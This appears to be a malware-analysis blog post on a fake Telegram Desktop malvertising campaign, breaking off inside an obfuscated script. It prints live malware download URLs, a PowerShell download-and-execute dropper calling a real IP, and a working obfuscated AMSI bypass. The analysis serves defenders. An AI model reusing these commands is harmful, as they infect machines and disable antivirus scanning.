<html>
    <head>
        <title>setuid(0); Research Team</title>
        <link rel="icon" type="image/png" href="/static/img/favicon.png" sizes="32x32">

        <script src="/static/js/jquery-3.6.0.min.js"></script>

        <link href="/static/semantic/semantic.min.css" rel="stylesheet" />
        <link href="/static/css/halfmoon-variables.min.css" rel="stylesheet" />

        <script src="/static/semantic/semantic.min.js"></script>   


        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.2.0/styles/base16/dracula.min.css">
        <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.2.0/highlight.min.js"></script>
        
        <link href="/static/css/suid.css" rel="stylesheet" />
    </head>

    <body>
        <div class="page-wrapper with-navbar-fixed-bottom">
            <div class="content-wrapper">
                <nav class="navbar">

                    <a href="/home.html" class="navbar-brand">
                        setuid(0);
                    </a>

                    <ul class="navbar-nav d-none d-md-flex"> 
                        <li class="nav-item">
                            <a href="/research.html" class="nav-link">
                                <button class="btn alt-dm active" type="button" style="color:#0FFFFF;">Research</button>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a href="/art.html" class="nav-link">
                                <button class="btn alt-dm active" type="button" style="color:#FF1493;">Art</button>
                            </a>
                        </li>
                    </ul>

                </nav>

                <div id="pageContent" class="container-fluid">
                    
<div class="w-1000 mw-full">
    <div class="card p-0 bg-very-dark-dm"> 
        <div class="table-responsive">
            <table class="table table-bordered">
                <thead>
                    <tr>
                        
                        <td><b>ID</b></td>
                        
                        <td><b>Type</b></td>
                        
                        <td><b>Malware</b></td>
                        
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        
                        <td>
                            SMAL-2021-00001
                        </td>
                        
                        <td>
                            Spyware/Malvertising
                        </td>
                        
                        <td>
                            Telegram Malvertising Campaign (March 2021)
                        </td>
                        
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>



<div style="margin-left:30px;">
    

    

<h1>TL:DR</h1>
<ul>
<li><b>Attack Vector: </b> PE Files targeting windows users                                                                   </li>
<li><b>Malware Type:  </b> Spyware / Stealer                                                                                  </li>
<li><b>Campaign:      </b> Fake Telegram Desktop Clients                                                                      </li>
<li><b>Infections:    </b> At least 2746 Downloads, 129 confirmed second stage downloads for telegramdesktop.com malware      </li>
<li><b>Campaign Time: </b> ~March 08, 2021   																				  </li>
</ul>	


<h1>Analysis of an active Telegram malvertising campaign</h1>

While browsing the web our research team came across an interesting malvertising campaign. <br />
A change in the privacy terms of the popular chat application WhatsApp has lead to an increased adoption of alternatives such as Threema, Signal and Telegram. <br>
Telegram also provides a desktop clients for most operating systems which allows for comfortable texting while on desktop operating systems. <br />
Let's search for it on google: <br />
<center>
    <img src="/static/article_images/telegram_malware/google.png" height="60%"/>
</center>
<br />

This is certainly an interesting ad. Let's investigate it more. <br /><br />

When accessing the link one can find an innocent looking page:<br />
<center>
    <img src="/static/article_images/telegram_malware/webpage1.png" height="60%"/>
</center>
But when investigating the links we see that it replaced the windows binary with malware:<br />
<center>
    <img src="/static/article_images/telegram_malware/webpage2.png" height="60%"/>
</center>

When digging deeper we discovered that this site was only the tip of the iceberg and part of a larger campaign using the same TTP. <br>
Using a TLD checker it was possible to discover three pages that looked exactly the same and followed the same pattern with a replaced windows binary:<br />
<center>
    <img src="/static/article_images/telegram_malware/tld_checker.png" height="60%"/>
</center>
<br />
<br />

Looking at the certificates we can see that they were issued by the same CA and in a similar timeframe: <br>
<center>
    <table>
        <tr>
            <td><img src="/static/article_images/telegram_malware/comcert.png" height="60%" /></td>
            <td><img src="/static/article_images/telegram_malware/netcert.png" height="60%" /></td>
            <td><img src="/static/article_images/telegram_malware/orgcert.png" height="60%" /></td>
        </tr>
    </table>
</center>
<br />
<br />

When checking the whois informations it is noticable that all domains are registered under namecheap.com which makes it highly likely that they are from the same threat actor. <br>
<center>
    <table>
        <tr>
            <td><img src="/static/article_images/telegram_malware/whois1.png" height="60%" /><br /></td>
            <td><img src="/static/article_images/telegram_malware/whois2.png" height="60%" /><br /></td>
            <td><img src="/static/article_images/telegram_malware/whois3.png" height="60%" /><br /></td>
        </tr>
    </table>
</center>
<br />


Unfortunately all pages are protected by a WhoisGuard service that hides the admin's identity: 
<br />
<center>
    <img src="/static/article_images/telegram_malware/namecheap_guard.png" height="60%" />
</center>
<br />
<br />

Interestingly one of their pages (telegramdesktop.com) have already been detected and blocked by google chrome: 
<br />
<center>
    <img src="/static/article_images/telegram_malware/google_danger.png" height="60%" />
</center>
<br />


All three pages have been archived by us:<br />
<ul>
<li>https://web.archive.org/web/20210314215652/https://telegramdesktop.org/</li>
<li>https://web.archive.org/web/20210314215723/https://telegramdesktop.net/</li>
<li>https://web.archive.org/web/20210314215710/https://telegramdesktop.com/</li>
</ul><br /><br />

<h1>Analysis telegramdesktop.com site</h1><br />

The .com site distributes it's file over a bitbucker repository (github alternative). <br>
When accessing the repo we can gather some information about infections, dates of the operation as well as other malware samples: <br>
<center>
    <img src="/static/article_images/telegram_malware/bitbucket_com.png" height="60%" />
</center>

<br />
<br />

The following files have been found:<br />

<ul>                                                                              </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/get/31a6a41f7711.zip               </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/TelegramInstaller.exe    </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/Crycker.exe              </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/TelegramInstallerX86.exe </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/RuntimeBroker.exe        </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/rxr.exe                  </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/zxc.exe                  </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/SoftwareUpdate.exe       </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/Discord_x86_Setup.exe    </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/TGInstaller.exe          </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/TGInstaller.scr          </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/DRX.exe                  </li>
<li>https://bitbucket.org/LLCTRUST/softwarellc/downloads/SmartScreenUpdater.exe   </li>
</ul><br />

When checking the commits we find a user called TrustedVarios: <br>
<center>
    <img src="/static/article_images/telegram_malware/commits_com.png" height="60%" />
</center>
<br />
<br />

Looking at the raw commit one can see that the email adress of the threat actor is beertmp+dtemn@gmail.com 
<br />
<center>
    <img src="/static/article_images/telegram_malware/raw_commit.png" height="60%" />
</center>
<br />
<br />

The actor also had another repository called WaskoTrustedLLC which only contained the telegram installer: 
<br />
<center>
    <img src="/static/article_images/telegram_malware/waskotrusted_repo.PNG" height="60%"/>
</center>
<br />

<ul>
<li>https://bitbucket.org/LLCTRUST/waskotrustedllc/downloads/TelegramInstaller.exe</li>
</ul><br />


The portable link shows a different repository https://bitbucket.org/takax/1/downloads/TelegramInstaller.rar: <br>
<img src="/static/article_images/telegram_malware/portable_comsite.PNG" height="60%"><img><br /><br>

This user only has one repository:<br>
<img src="/static/article_images/telegram_malware/takax_repos.PNG" height="60%"><img><br /><br>

As well as one project:<br>
<img src="/static/article_images/telegram_malware/takax_projects.PNG" height="60%"><img><br /><br>

However the repository contains a lot of files: <br />
<ul>
<li>https://bitbucket.org/takax/1/downloads/TGInstaller.rar       </li>
<li>https://bitbucket.org/takax/1/downloads/TelegramInstaller.rar </li>
<li>https://bitbucket.org/takax/1/downloads/RDP.exe               </li>
<li>https://bitbucket.org/takax/1/downloads/TelegramInstaller.exe </li>
<li>https://bitbucket.org/takax/1/downloads/clr.exe               </li>
<li>https://bitbucket.org/takax/1/downloads/12.bat                </li>
</ul>                                                            


A file that seems like a great target for analysis is 12.bat:<br />
<div style="background: #000000; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1
2
3</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #cdcd00">if</span> <span style="color: #cccccc">not</span> <span style="color: #cccccc">DEFINED</span> <span style="color: #cccccc">IS_MINIMIZED</span> <span style="color: #cccccc">set</span> <span style="color: #cccccc">IS_MINIMIZED=1</span> <span style="color: #cccccc">&amp;&amp;</span> <span style="color: #cccccc">start</span> <span style="color: #cd0000">&quot;&quot;</span> <span style="color: #cccccc">/min</span> <span style="color: #cd0000">&quot;%~dpnx0&quot;</span> <span style="color: #cccccc">%*</span> <span style="color: #cccccc">&amp;&amp;</span> <span style="color: #cccccc">exit</span>
<span style="color: #cccccc">powershell</span> <span style="color: #cccccc">-w</span> <span style="color: #cccccc">hidden</span> <span style="color: #cccccc">-ep</span> <span style="color: #cccccc">bypass</span> <span style="color: #cccccc">-enc</span> <span style="color: #cccccc">SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQA0AC4AMQA1ADgALgAyADQANQAuADgAOAAvAG0AYQBlAC4AcABzADEAJwApAA==</span>
<span style="color: #cccccc">exit</span>
</pre></td></tr></table></div>
<br /><br />

The code is a powershell dropper, let's base64 decode it:<br />
<div style="background: #000000; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #cccccc">IEX</span> <span style="color: #cccccc">(</span><span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">Net.Webclient).downloadstring(</span><span style="color: #cd0000">&#39;http://94.158.245.88/mae.ps1&#39;</span><span style="color: #cccccc">)</span>
</pre></td></tr></table></div>
<br /><br />

The host is still up so let's download the file:<br />
<div style="background: #000000; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1
2
3
4
5</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #cccccc">(</span><span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">Net.Webclient).downloadstring(</span><span style="color: #cd0000">&quot;http://94.158.245.88/mae/start.vbs&quot;</span><span style="color: #cccccc">)</span> <span style="color: #cccccc">|</span> <span style="color: #cd00cd">out-file</span> <span style="color: #00cdcd">$env:temp</span><span style="color: #cccccc">\start.vbs</span>
<span style="color: #cccccc">(</span><span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">Net.Webclient).downloadstring(</span><span style="color: #cd0000">&quot;http://94.158.245.88/mae/Get-Content.ps1&quot;</span><span style="color: #cccccc">)</span> <span style="color: #cccccc">|</span> <span style="color: #cd00cd">out-file</span> <span style="color: #00cdcd">$env:temp</span><span style="color: #cccccc">\</span><span style="color: #cd00cd">Get-Content</span><span style="color: #cccccc">.ps1</span>
<span style="color: #cccccc">(</span><span style="color: #cd00cd">New-Object</span> <span style="color: #cccccc">Net.Webclient).downloadstring(</span><span style="color: #cd0000">&quot;http://94.158.245.88/mae/ready.ps1&quot;</span><span style="color: #cccccc">)</span> <span style="color: #cccccc">|</span> <span style="color: #cd00cd">out-file</span> <span style="color: #00cdcd">$env:temp</span><span style="color: #cccccc">\ready.ps1</span>

<span style="color: #cd00cd">start-process</span> <span style="color: #cccccc">wscript</span> <span style="color: #cccccc">-args</span> <span style="color: #cd0000">&quot;$env:temp\start.vbs&quot;</span>
</pre></td></tr></table></div>
<br /><br />

The start.vbs looks at SMBiosData over WMI which seems to be an Anti-VM technique.<br />
If it is successfull it calls the ready.ps1 file<br />
<div style="background: #000000; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%"> 1
2
3
4
5
6
7
8
9
10
11
12
13
14
15</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #cccccc">Set</span> <span style="color: #cccccc">tables</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">GetObject(</span><span style="color: #cd0000">&quot;winmgmts:\\.\root\wmi&quot;</span><span style="color: #cccccc">).ExecQuery</span> <span style="color: #cccccc">_</span>
<span style="color: #cccccc">(</span><span style="color: #cd0000">&quot;SELECT * FROM MSSmBios_RawSMBiosTables&quot;</span><span style="color: #cccccc">)</span>

<span style="color: #cdcd00">For</span> <span style="color: #cccccc">Each</span> <span style="color: #cccccc">obj</span> <span style="color: #cdcd00">In</span> <span style="color: #cccccc">tables</span>
<span style="color: #cccccc">size=64</span> <span style="color: #cccccc">*</span> <span style="color: #cccccc">obj.SMBiosData(9)</span> <span style="color: #cccccc">+</span> <span style="color: #cccccc">64</span>


<span style="color: #cccccc">Next</span>

<span style="color: #cdcd00">If</span> <span style="color: #cccccc">size&gt;</span> <span style="color: #cccccc">128</span> <span style="color: #cccccc">Then</span>
<span style="color: #cccccc">gju=</span><span style="color: #cd0000">&quot;-eP ByPAsS &quot;</span>
<span style="color: #cccccc">dyf</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;powErsHell &quot;</span><span style="color: #cccccc">+gju+</span><span style="color: #cd0000">&quot; -F %temp%\ready.ps1&quot;</span>

<span style="color: #cccccc">CreateObject(</span><span style="color: #cd0000">&quot;Wscript.Shell&quot;</span><span style="color: #cccccc">).Run</span> <span style="color: #cccccc">dyf,</span> <span style="color: #cccccc">0,</span> <span style="color: #cccccc">false</span>
<span style="color: #cdcd00">End</span> <span style="color: #cdcd00">If</span>
</pre></td></tr></table></div>
<br /><br />

The ready.ps1 file seems to be obfuscated a bit.<br />
<div style="background: #000000; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%"> 1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #cd00cd">set-alias</span> <span style="color: #cccccc">yq4s</span> <span style="color: #cccccc">$([char](170-55)+[char](157-56)+[char](171-55)+[char](149-104)+[char](145-48)+[char](208-100)+[char](221-116)+[char](208-111)+[char](235-120))</span>
<span style="color: #00cdcd">$8j5w</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$executioncontext</span>
<span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">=$([char](210-105)+[char](162-52)+[char](239-121)+[char](226-115)+[char](226-119)+[char](156-55)+[char](202-103)+[char](164-53)+[char](209-100)+[char](207-98)+[char](216-119)+[char](213-103)+[char](208-108))</span>
<span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">=$([char](155-54)+[char](227-107)+[char](162-50)+[char](197-100)+[char](160-50)+[char](216-116)+[char](214-99)+[char](226-110)+[char](234-120)+[char](202-97)+[char](207-97)+[char](152-49))</span>
<span style="color: #00cdcd">$jgl8h</span><span style="color: #cccccc">=</span><span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](203-98)+[char](231-121)+[char](218-100)+[char](225-114)+[char](213-106)+[char](215-114)+[char](155-110)+[char](149-48)+[char](169-49)+[char](165-53)+[char](222-108)+[char](150-49)+[char](218-103)+[char](224-109)+[char](205-100)+[char](231-120)+[char](166-56)))</span>


<span style="color: #00cdcd">$fuapm</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">$([char]13+[char]10+[char]13+[char]10+[char]117+[char]115+[char]105+[char]110+[char]103+[char]32+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]59+[char]13+[char]10+[char]117+[char]115+[char]105+[char]110+[char]103+[char]32+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]82+[char]117+[char]110+[char]116+[char]105+[char]109+[char]101+[char]46+[char]73+[char]110+[char]116+[char]101+[char]114+[char]111+[char]112+[char]83+[char]101+[char]114+[char]118+[char]105+[char]99+[char]101+[char]115+[char]59+[char]13+[char]10+[char]13+[char]10+[char]112+[char]117+[char]98+[char]108+[char]105+[char]99+[char]32+[char]99+[char]108+[char]97+[char]115+[char]115+[char]32+[char]90+[char]74+[char]97+[char]101+[char]88+[char]82+[char]72+[char]32+[char]123+[char]13+[char]10+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]91+[char]68+[char]108+[char]108+[char]73+[char]109+[char]112+[char]111+[char]114+[char]116+[char]40+[char]34+[char]107+[char]101+[char]114+[char]110+[char]101+[char]108+[char]51+[char]50+[char]34+[char]44+[char]32+[char]69+[char]110+[char]116+[char]114+[char]121+[char]80+[char]111+[char]105+[char]110+[char]116+[char]61+[char]34+[char]71+[char]101+[char]116+[char]80+[char]114+[char]111+[char]99+[char]65+[char]100+[char]100+[char]114+[char]101+[char]115+[char]115+[char]34+[char]41+[char]93+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]112+[char]117+[char]98+[char]108+[char]105+[char]99+[char]32+[char]115+[char]116+[char]97+[char]116+[char]105+[char]99+[char]32+[char]101+[char]120+[char]116+[char]101+[char]114+[char]110+[char]32+[char]73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]103+[char]112+[char]97+[char]40+[char]73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]104+[char]77+[char]111+[char]100+[char]117+[char]108+[char]101+[char]44+[char]32+[char]115+[char]116+[char]114+[char]105+[char]110+[char]103+[char]32+[char]112+[char]114+[char]111+[char]99+[char]78+[char]97+[char]109+[char]101+[char]41+[char]59+[char]13+[char]10+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]91+[char]68+[char]108+[char]108+[char]73+[char]109+[char]112+[char]111+[char]114+[char]116+[char]40+[char]34+[char]107+[char]101+[char]114+[char]110+[char]101+[char]108+[char]51+[char]50+[char]34+[char]44+[char]32+[char]69+[char]110+[char]116+[char]114+[char]121+[char]80+[char]111+[char]105+[char]110+[char]116+[char]61+[char]34+[char]76+[char]111+[char]97+[char]100+[char]76+[char]105+[char]98+[char]114+[char]97+[char]114+[char]121+[char]34+[char]41+[char]93+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]112+[char]117+[char]98+[char]108+[char]105+[char]99+[char]32+[char]115+[char]116+[char]97+[char]116+[char]105+[char]99+[char]32+[char]101+[char]120+[char]116+[char]101+[char]114+[char]110+[char]32+[char]73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]108+[char]108+[char]105+[char]98+[char]40+[char]115+[char]116+[char]114+[char]105+[char]110+[char]103+[char]32+[char]110+[char]97+[char]109+[char]101+[char]41+[char]59+[char]13+[char]10+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]91+[char]68+[char]108+[char]108+[char]73+[char]109+[char]112+[char]111+[char]114+[char]116+[char]40+[char]34+[char]107+[char]101+[char]114+[char]110+[char]101+[char]108+[char]51+[char]50+[char]34+[char]44+[char]32+[char]69+[char]110+[char]116+[char]114+[char]121+[char]80+[char]111+[char]105+[char]110+[char]116+[char]61+[char]34+[char]86+[char]105+[char]114+[char]116+[char]117+[char]97+[char]108+[char]80+[char]114+[char]111+[char]116+[char]101+[char]99+[char]116+[char]34+[char]41+[char]93+[char]13+[char]10+[char]32+[char]32+[char]32+[char]32+[char]112+[char]117+[char]98+[char]108+[char]105+[char]99+[char]32+[char]115+[char]116+[char]97+[char]116+[char]105+[char]99+[char]32+[char]101+[char]120+[char]116+[char]101+[char]114+[char]110+[char]32+[char]98+[char]111+[char]111+[char]108+[char]32+[char]118+[char]112+[char]114+[char]40+[char]73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]108+[char]112+[char]65+[char]100+[char]100+[char]114+[char]101+[char]115+[char]115+[char]44+[char]32+[char]85+[char]73+[char]110+[char]116+[char]80+[char]116+[char]114+[char]32+[char]100+[char]119+[char]83+[char]105+[char]122+[char]101+[char]44+[char]32+[char]117+[char]105+[char]110+[char]116+[char]32+[char]102+[char]108+[char]78+[char]101+[char]119+[char]80+[char]114+[char]111+[char]116+[char]101+[char]99+[char]116+[char]44+[char]32+[char]111+[char]117+[char]116+[char]32+[char]117+[char]105+[char]110+[char]116+[char]32+[char]108+[char]112+[char]102+[char]108+[char]79+[char]108+[char]100+[char]80+[char]114+[char]111+[char]116+[char]101+[char]99+[char]116+[char]41+[char]59+[char]13+[char]10+[char]13+[char]10+[char]125+[char]13+[char]10)</span> 

<span style="color: #cd00cd">Add-Type</span> <span style="color: #00cdcd">$fuapm</span>

<span style="color: #00cdcd">$hcxku</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[ZJaeXRH]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">llib(</span><span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](202-105)+[char](215-106)))</span> <span style="color: #cccccc">+</span> <span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](165-50)+[char](157-52)+[char](102-56)+[char](219-119)+[char](219-111)+[char](158-50))))</span>
<span style="color: #00cdcd">$3qsr18w91</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[ZJaeXRH]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">gpa(</span><span style="color: #00cdcd">$hcxku</span><span style="color: #cccccc">,</span> <span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](173-108)+[char](166-57)+[char](212-97)+[char](220-115)))</span> <span style="color: #cccccc">+</span> <span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](203-120)+[char](150-51)+[char](202-105)+[char](224-114)))</span> <span style="color: #cccccc">+</span> <span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](123-57)+[char](231-114)+[char](218-116)+[char](220-118)+[char](223-122)+[char](163-49))))</span>
<span style="color: #00cdcd">$3qsr1</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">0</span>
<span style="color: #cccccc">[ZJaeXRH]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">vpr(</span><span style="color: #00cdcd">$3qsr18w91</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">[uint32]5,</span> <span style="color: #cccccc">(114-50),</span> <span style="color: #cccccc">[ref]</span><span style="color: #00cdcd">$3qsr1</span><span style="color: #cccccc">)</span>
<span style="color: #00cdcd">$huzro</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">[Byte[]]</span> <span style="color: #cccccc">((236-52),</span> <span style="color: #cccccc">(199-112),</span> <span style="color: #cccccc">(103-103),</span> <span style="color: #cccccc">(109-102),</span> <span style="color: #cccccc">(225-97),</span> <span style="color: #cccccc">(307-112))</span>
<span style="color: #cccccc">[System.Runtime.InteropServices.Marshal]</span><span style="color: #cccccc; border: 1px solid #FF0000">::</span><span style="color: #cccccc">Copy(</span><span style="color: #00cdcd">$huzro</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">0,</span> <span style="color: #00cdcd">$3qsr18w91</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">6)</span> 
<span style="color: #cccccc">iex</span> <span style="color: #00cdcd">$env:temp</span><span style="color: #cccccc">\</span><span style="color: #cd00cd">Get-Content</span><span style="color: #cccccc">.PS1</span>
</pre></td></tr></table></div>

<br /><br />

We can decode it using a small script (for convenience sake we removed all brackets around operations:<br />
<div style="background: #000000; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%"> 1
2
3
4
5
6
7
8
9
10
11
12</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #cccccc">import</span> <span style="color: #cccccc">re</span>

<span style="color: #cccccc">with</span> <span style="color: #cccccc">open(</span><span style="color: #cd0000">&quot;ready.ps1&quot;</span><span style="color: #cccccc">)</span> <span style="color: #cccccc">as</span> <span style="color: #cccccc">file</span><span style="color: #cccccc; border: 1px solid #FF0000">:</span>
<span style="color: #cccccc">data</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">file.read()</span>
<span style="color: #cccccc">res</span> <span style="color: #cccccc">=</span> <span style="color: #cccccc">re.findall(r</span><span style="color: #cd0000">&#39;\(.*?\)&#39;</span><span style="color: #cccccc">,</span> <span style="color: #cccccc">data)</span>
<span style="color: #cccccc">out</span> <span style="color: #cccccc">=</span> <span style="color: #cd0000">&quot;&quot;</span>
<span style="color: #cdcd00">for</span> <span style="color: #cccccc">i</span> <span style="color: #cdcd00">in</span> <span style="color: #cccccc">res</span><span style="color: #cccccc; border: 1px solid #FF0000">:</span>
    <span style="color: #cdcd00">try</span><span style="color: #cccccc; border: 1px solid #FF0000">:</span>
        <span style="color: #cccccc">out</span> <span style="color: #cccccc">+=</span> <span style="color: #cccccc">chr(eval(i[1</span><span style="color: #cccccc; border: 1px solid #FF0000">:</span><span style="color: #cccccc">-1]))</span>
    <span style="color: #cccccc">except</span><span style="color: #cccccc; border: 1px solid #FF0000">:</span>
        <span style="color: #cccccc">pass</span>
<span style="color: #cccccc">print(out)</span>
</pre></td></tr></table></div>
<br /><br />

Which prints the following strings:<br />
<div style="background: #000000; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #cd00cd">set-alias</span> <span style="color: #cccccc">invokecommand</span> <span style="color: #cccccc">expandstring</span> <span style="color: #cd00cd">invoke-expression</span> <span style="color: #cccccc">AmsiScanBufferamsi.dll</span><span style="color: #cccccc; border: 1px solid #FF0000">@Â¸</span><span style="color: #cccccc">W</span>
</pre></td></tr></table></div>
<br />
It seems like an Amsi bypass. The Antimalware Scan Interface (Amsi) is an interface standard to integrate services with antimalware products.<br />
The goal seems to be to bypass AV products before running Get-Content.ps1.<br /><br />

The Get-Content.ps1 file seems similar:<br />
<!-- HTML generated using hilite.me --><div style="background: #000000; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%"> 1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #cd00cd">set-alias</span> <span style="color: #cccccc">yq4s</span> <span style="color: #cccccc">$([char](170-55)+[char](157-56)+[char](171-55)+[char](149-104)+[char](145-48)+[char](208-100)+[char](221-116)+[char](208-111)+[char](235-120))</span>
<span style="color: #00cdcd">$8j5w</span> <span style="color: #cccccc">=</span> <span style="color: #00cdcd">$executioncontext</span>
<span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">=$([char](210-105)+[char](162-52)+[char](239-121)+[char](226-115)+[char](226-119)+[char](156-55)+[char](202-103)+[char](164-53)+[char](209-100)+[char](207-98)+[char](216-119)+[char](213-103)+[char](208-108))</span>
<span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">=$([char](155-54)+[char](227-107)+[char](162-50)+[char](197-100)+[char](160-50)+[char](216-116)+[char](214-99)+[char](226-110)+[char](234-120)+[char](202-97)+[char](207-97)+[char](152-49))</span>
<span style="color: #00cdcd">$jgl8h</span><span style="color: #cccccc">=</span><span style="color: #00cdcd">$8j5w</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$i6l7</span><span style="color: #cccccc">.</span><span style="color: #00cdcd">$e7zp</span><span style="color: #cccccc">($([char](203-98)+[char](231-121)+[char](218-100)+[char](225-114)+[char](213-106)+[char](215-114)+[char](155-110)+[char](149-48)+[char](169-49)+[char](165-53)+[char](222-108)+[char](150-49)+[char](218-103)+[char](224-109)+[char](205-100)+[char](231-120)+[char](166-56)))</span>


<span style="color: #00cdcd">$fuapm</span> <span style="color: #cccccc">=</span> <span style="color: 